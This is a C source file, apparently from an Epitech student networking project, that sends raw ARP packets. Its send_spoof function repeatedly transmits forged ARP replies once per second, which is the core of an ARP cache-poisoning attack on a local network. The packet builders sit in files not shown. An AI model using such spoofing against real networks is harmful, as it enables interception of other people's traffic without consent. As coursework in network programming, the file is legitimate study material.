/*
** EPITECH PROJECT, 2019
** NWP_mychap_2018
** File description:
** send
*/

#include "myspoof.h"

void send_arp_paquet(t_spoof *_spoof)
{
    memset(_spoof->packet, 0, ETH_DATA_LEN);
    build_eth(_spoof);
    build_arp(_spoof);
    if (_spoof->printBroadcast == true) {
        print_packet(_spoof);
        exit(0);
    }
    sendto(_spoof->sock_fd, _spoof->packet, sizeof(struct ethhdr)
    + sizeof(struct ether_arp), 0, (struct sockaddr*)
    &(_spoof->d_arp), sizeof(struct sockaddr_ll));
}

void send_spoof(t_spoof *_spoof)
{
    memset(_spoof->packet, 0, ETH_DATA_LEN);
    build_eth(_spoof);
    build_arp_reply(_spoof);
    if (_spoof->printSpoof == true) {
        print_packet(_spoof);
        exit(0);
    }
    while (1) {
        sendto(_spoof->sock_fd, _spoof->packet, sizeof(struct ethhdr)
        + sizeof(struct arphdr), 0, (struct sockaddr*)
        &(_spoof->d_arp), sizeof(struct sockaddr_ll));
        printf("Spoofed packet sent to ‘%s’\n", _spoof->dest_ip);
        sleep(1);
    }
}